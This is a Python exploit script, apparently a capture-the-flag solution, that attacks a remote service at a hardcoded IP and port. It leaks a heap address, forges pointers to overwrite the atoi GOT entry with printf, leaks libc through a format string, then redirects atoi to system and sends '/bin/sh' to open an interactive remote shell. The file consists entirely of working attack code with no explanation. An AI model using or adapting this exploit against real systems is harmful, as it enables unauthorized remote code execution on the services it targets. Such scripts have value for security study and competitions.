#!/usr/bin/env python
from sc_pwn import *

#target     = {'host':'192.168.75.129','port':8080}
target     = {'host':'166.111.132.49','port':9999}

addr_ptr_buf        = 0x00010fb4

addr_plt_printf     = 0x00008594
addr_got_main       = 0x00010f74
addr_got_atoi       = 0x00010f80

offset_libc_system  = 0x0003a8b8
offset_libc_main    = 0x0001770c

prev_target         = None

#==========
def attack(cmn):
    cmn.read_until('key:')
    cmn.send('a'*8)
    cmn.read(8)
    
    addr_heap  = cmn.read_until(' is')[:-3]
    addr_heap += '\x00'*(4-len(addr_heap))
    addr_heap  = unpack_32(addr_heap)-8
    info('addr_heap         : 0x%08x' % addr_heap)

    cmn.read_until('key:')
    cmn.send('security')

    exploit_st1  = '\x00'*0xc
    exploit_st1 += pack_32(0xffffffff)
    cmn.read_until('(1-4):')
    cmn.sendln('2')
    cmn.read_until('secret:')
    cmn.sendln(exploit_st1)

    cmn.read_until('(1-4):')
    cmn.sendln('3')
    cmn.read_until('length:')
    cmn.sendln(str(addr_ptr_buf-0x4-(addr_heap+0x18)-0x8))

    rewrite(cmn, addr_got_atoi, pack_32(addr_plt_printf))

    exploit_st2  ='%6$s'
    exploit_st2 += pack_32(addr_got_main)
    cmn.read_until('(1-4):')
    cmn.sendln(exploit_st2)

    addr_libc_main      = unpack_32(cmn.read_until('wrong')[0:4])
    addr_libc_base      = addr_libc_main - offset_libc_main
    addr_libc_system    = addr_libc_base + offset_libc_system
    info('addr_libc_base    : 0x%08x' % addr_libc_base)
    
    rewrite(cmn, addr_got_atoi, pack_32(addr_libc_system), False)
    
    cmn.read_until('(1-4):')
    cmn.sendln('/bin/sh')    

def rewrite(cmn, addr, data, atoi=True):
    global prev_target
    
    ptr_buf  = pack_32(0xdeadbeef)
    ptr_buf += pack_32(addr)            # secret(2)
    ptr_buf += pack_32(0xcafebabe)      # name  (3)
    ptr_buf += pack_32(addr_ptr_buf-4)  # key   (1)

    if addr != prev_target:
        cmn.read_until('(1-4):')
        cmn.sendln('1' if atoi else '')
        cmn.read_until('key:')
        cmn.send(ptr_buf)
        prev_target = addr

    cmn.read_until('(1-4):')
    cmn.sendln('2')
    cmn.read_until('secret:')
    cmn.sendln(data)

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='RAW')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
